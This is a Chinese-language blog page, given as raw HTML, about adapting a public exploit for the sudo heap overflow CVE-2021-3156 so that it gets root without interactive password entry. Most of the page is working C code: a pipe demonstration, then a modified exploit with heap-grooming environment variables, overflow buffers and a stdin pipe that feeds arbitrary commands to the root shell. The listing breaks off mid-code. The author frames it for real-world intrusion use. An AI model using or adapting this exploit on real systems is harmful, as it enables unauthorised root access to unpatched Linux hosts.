<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><link rel=stylesheet href=/css/fancybox.css><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>CVE-2021-3156 - Exploit修改 - 倾旋的博客</title><meta name=theme-color><meta name=description content='New-Exploit :  https://github.com/Rvn0xsy/CVE-2021-3156-plus
0x01 为什么要修改？
本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。
0x02 Linux 管道符
在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：
echo "new-pass" | passwd --stdin username

该命令只适用于旧版，不建议在命令行中传递明文密码

于是我查看了sudoedit的帮助参数：

  


设置-S参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。
0x03 Exploit分析
本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用execve触发。
#include <unistd.h>
int execve(const char *pathname, char *const argv[],char *const envp[]);

  


在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：
char* sudoedit_argv[] = {
    "sudoedit",
    "-S", // --stdin 非交互式
    "-s",
    buf,
    NULL};
紧接着，需要思考如何传入密码了。

经过测试，即使密码错误的情况下，也能够提权成功。

经过查阅资料，关于execve的特点如下：
execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。
All process attributes are preserved during an execve(), except the following:

The dispositions of any signals that are being caught are reset to the default (signal(7)).
Any alternate signal stack is not preserved (sigaltstack(2)).
Memory mappings are not preserved (mmap(2)).
Attached System V shared memory segments are detached (shmat(2)).
POSIX shared memory regions are unmapped (shm_open(3)).
Open POSIX message queue descriptors are closed(mq_overview(7)).
Any open POSIX named semaphores are closed (sem_overview(7)).
POSIX timers are not preserved (timer_create(2)).
Any open directory streams are closed (opendir(3)).
Memory locks are not preserved (mlock(2), mlockall(2)).
Exit handlers are not preserved (atexit(3), on_exit(3)).
The floating-point environment is reset to the default (see fenv(3)).
&mldr;.

这就意味着，在调用execve之前向stdin写入数据，创建后的进程也是读不到的。'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.153.5"><meta itemprop=name content="CVE-2021-3156 - Exploit修改"><meta itemprop=description content="Qualys研究团队在sudo中发现了一个堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。"><meta itemprop=datePublished content="2021-02-09T00:00:00+00:00"><meta itemprop=dateModified content="2021-02-09T00:00:00+00:00"><meta itemprop=wordCount content="568"><meta property="og:url" content="https://payloads.online/archivers/2021-02-09/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="CVE-2021-3156 - Exploit修改"><meta property="og:description" content="Qualys研究团队在sudo中发现了一个堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-09T00:00:00+00:00"><meta property="article:modified_time" content="2021-02-09T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-3156 - Exploit修改"><meta name=twitter:description content="Qualys研究团队在sudo中发现了一个堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。"><link rel=canonical href=https://payloads.online/archivers/2021-02-09/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">CVE-2021-3156 - Exploit修改</h1><div class="text-xs antialiased opacity-60"><time>Feb 9, 2021</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><p>New-Exploit : <a href=https://github.com/Rvn0xsy/CVE-2021-3156-plus>https://github.com/Rvn0xsy/CVE-2021-3156-plus</a></p><h2 id=0x01-为什么要修改>0x01 为什么要修改？</h2><p>本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。</p><h2 id=0x02-linux-管道符>0x02 Linux 管道符</h2><p>在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;new-pass&#34;</span> | passwd --stdin username
</span></span></code></pre></div><blockquote><p>该命令只适用于旧版，不建议在命令行中传递明文密码</p></blockquote><p>于是我查看了<code>sudoedit</code>的帮助参数：</p><p><a href=https://images.payloads.online/aee35152-4f5f-11ec-9dea-00d861bf4abb.png data-fancybox=gallery data-caption=2021-02-10-02-34-34><img src=https://images.payloads.online/aee35152-4f5f-11ec-9dea-00d861bf4abb.png alt=2021-02-10-02-34-34></a></p><p>设置<code>-S</code>参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。</p><h2 id=0x03-exploit分析>0x03 Exploit分析</h2><p>本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用<code>execve</code>触发。</p><pre tabindex=0><code>#include &lt;unistd.h&gt;
int execve(const char *pathname, char *const argv[],char *const envp[]);
</code></pre><p><a href=https://images.payloads.online/af21b1ea-4f5f-11ec-b856-00d861bf4abb.png data-fancybox=gallery data-caption=2021-02-10-02-44-51><img src=https://images.payloads.online/af21b1ea-4f5f-11ec-b856-00d861bf4abb.png alt=2021-02-10-02-44-51></a></p><p>在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> sudoedit_argv[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;sudoedit&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;-S&#34;</span>, <span style=color:#75715e>// --stdin 非交互式
</span></span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;-s&#34;</span>,
</span></span><span style=display:flex><span>    buf,
</span></span><span style=display:flex><span>    NULL};
</span></span></code></pre></div><p>紧接着，需要思考如何传入密码了。</p><blockquote><p>经过测试，即使密码错误的情况下，也能够提权成功。</p></blockquote><p>经过查阅资料，关于execve的特点如下：</p><p>execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。</p><p>All process attributes are preserved during an execve(), except the following:</p><ul><li>The dispositions of any signals that are being caught are reset to the default (signal(7)).</li><li>Any alternate signal stack is not preserved (sigaltstack(2)).</li><li>Memory mappings are not preserved (mmap(2)).</li><li>Attached System V shared memory segments are detached (shmat(2)).</li><li>POSIX shared memory regions are unmapped (shm_open(3)).</li><li>Open POSIX message queue descriptors are closed(mq_overview(7)).</li><li>Any open POSIX named semaphores are closed (sem_overview(7)).</li><li>POSIX timers are not preserved (timer_create(2)).</li><li>Any open directory streams are closed (opendir(3)).</li><li>Memory locks are not preserved (mlock(2), mlockall(2)).</li><li>Exit handlers are not preserved (atexit(3), on_exit(3)).</li><li>The floating-point environment is reset to the default (see fenv(3)).</li><li>&mldr;.</li></ul><p>这就意味着，在调用execve之前向stdin写入数据，创建后的进程也是读不到的。</p><p>于是我写了一个小例子来测验我的解决办法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> argv)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> des_p[<span style=color:#ae81ff>2</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>pipe</span>(des_p) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;Pipe failed&#34;</span>);
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>fork</span>() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)  <span style=color:#75715e>// 创建一个子进程向stdout管道填入数据
</span></span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(STDOUT_FILENO);  <span style=color:#75715e>// 关闭系统输出流
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>dup</span>(des_p[<span style=color:#ae81ff>1</span>]);         <span style=color:#75715e>// 将系统输出流替换为管道
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>0</span>]);       <span style=color:#75715e>// 关闭输入管道
</span></span></span><span style=display:flex><span>            <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>1111&#34;</span>; <span style=color:#75715e>// 设置管道内容
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>write</span>(des_p[<span style=color:#ae81ff>1</span>],password, <span style=color:#a6e22e>strlen</span>(password)); <span style=color:#75715e>// 将内容写到输出管道中
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>// 关闭输出管道
</span></span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>fork</span>() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)            <span style=color:#75715e>// 创建一个子进程
</span></span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(STDIN_FILENO);   <span style=color:#75715e>// 关闭系统输入流
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>dup</span>(des_p[<span style=color:#ae81ff>0</span>]);         <span style=color:#75715e>// 将系统输入流替换为输入管道
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>1</span>]);       <span style=color:#75715e>//  关闭输出管道
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>0</span>]);     <span style=color:#75715e>// 关闭输入管道
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> prog2[] <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;wc&#34;</span>, <span style=color:#e6db74>&#34;-l&#34;</span>, <span style=color:#ae81ff>0</span>}; <span style=color:#75715e>// 执行wc -l 
</span></span></span><span style=display:flex><span>            <span style=color:#a6e22e>execvp</span>(prog2[<span style=color:#ae81ff>0</span>], prog2);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;execvp of wc failed&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><a href=https://images.payloads.online/af6100c0-4f5f-11ec-8c95-00d861bf4abb.png data-fancybox=gallery data-caption=2021-02-10-03-10-12><img src=https://images.payloads.online/af6100c0-4f5f-11ec-8c95-00d861bf4abb.png alt=2021-02-10-03-10-12></a></p><p>测试结果正确：2！</p><p>stdin的值为：<code>test\r\n1111</code>，wc -l 命令读取是以<code>\n</code>为每一项分割的，因此返回的是2。</p><p>这个方案可以直接拿到Exploit中，将stdin覆盖，向管道写入<code>密码\n命令</code>，然后把命令传入即可。</p><p>为什么这里是<code>密码\n命令</code>呢？</p><p>是因为第一个<code>\n</code>是为了结束密码的传递，然后开始堆溢出，溢出完成后，后续的命令刚好会传入到Shellcode启动的<code>/bin/sh</code>中。</p><p><a href=https://images.payloads.online/af9a9182-4f5f-11ec-8201-00d861bf4abb.png data-fancybox=gallery data-caption=2021-02-10-03-13-24><img src=https://images.payloads.online/af9a9182-4f5f-11ec-8201-00d861bf4abb.png alt=2021-02-10-03-13-24></a></p><p>修改后的Exploit：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt; // execve()</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt; // strcat()</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> argv[]) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Usage: %s &lt;Command&gt; </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,argv[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+]Refrence : @Qualys Research Team @Max Kamper </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+]Modify by Rvn0xsy@ https://payloads.online</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);	
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> input_command <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> nSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(input_command)<span style=color:#f92672>+</span><span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> command <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(nSize);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(command,<span style=color:#ae81ff>0x00</span>,nSize);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>sprintf</span>(command,<span style=color:#e6db74>&#34;test</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,input_command);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// &#39;buf&#39; size determines size of overflowing chunk.
</span></span></span><span style=display:flex><span>    <span style=color:#75715e>// This will allocate an 0xf0-sized chunk before the target service_user struct.
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> i;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0xf0</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(buf, <span style=color:#e6db74>&#39;Y&#39;</span>, <span style=color:#ae81ff>0xe0</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>strcat</span>(buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> sudoedit_argv[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;sudoedit&#34;</span>,
</span></span><span style=display:flex><span>	    <span style=color:#e6db74>&#34;-S&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;-s&#34;</span>,
</span></span><span style=display:flex><span>        buf,
</span></span><span style=display:flex><span>        NULL};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Use some LC_ vars for heap Feng-Shui.
</span></span></span><span style=display:flex><span>    <span style=color:#75715e>// This should allocate the target service_user struct in the path of the overflow.
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> messages[<span style=color:#ae81ff>0xe0</span>] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LC_MESSAGES=en_GB.UTF-8@&#34;</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(messages <span style=color:#f92672>+</span> <span style=color:#a6e22e>strlen</span>(messages), <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>0xb8</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> telephone[<span style=color:#ae81ff>0x50</span>] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LC_TELEPHONE=C.UTF-8@&#34;</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(telephone <span style=color:#f92672>+</span> <span style=color:#a6e22e>strlen</span>(telephone), <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>0x28</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> measurement[<span style=color:#ae81ff>0x50</span>] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LC_MEASUREMENT=C.UTF-8@&#34;</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(measurement <span style=color:#f92672>+</span> <span style=color:#a6e22e>strlen</span>(measurement), <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>0x28</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// This environment variable will be copied onto the heap after the overflowing chunk.
</span></span></span><span style=display:flex><span>    <span style=color:#75715e>// Use it to bridge the gap between the overflow and the target service_user struct.
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> overflow[<span style=color:#ae81ff>0x500</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(overflow, <span style=color:#e6db74>&#39;X&#39;</span>, <span style=color:#ae81ff>0x4cf</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>strcat</span>(overflow, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Overwrite the &#39;files&#39; service_user struct&#39;s name with the path of our shellcode library.
</span></span></span><span style=display:flex><span>    <span style=color:#75715e>// The backslashes write nulls which are needed to dodge a couple of crashes.
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> envp[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        overflow,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;XXXXXXX</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;x/x</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Z&#34;</span>,
</span></span><span style=display:flex><span>        messages,
</span></span><span style=display:flex><span>        telephone,
</span></span><span style=display:flex><span>        measurement,
</span></span><span style=display:flex><span>        NULL};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> des_p[<span style=color:#ae81ff>2</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>pipe</span>(des_p) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Error .. pipe </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>fork</span>() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)   
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(STDOUT_FILENO);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>dup</span>(des_p[<span style=color:#ae81ff>1</span>]);  
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>0</span>]); 
</span></span><span style=display:flex><span>	    <span style=color:#a6e22e>write</span>(des_p[<span style=color:#ae81ff>1</span>],command, <span style=color:#a6e22e>strlen</span>(command));
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>	    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>fork</span>()<span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>close</span>(STDIN_FILENO); 
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>dup</span>(des_p[<span style=color:#ae81ff>0</span>]);  
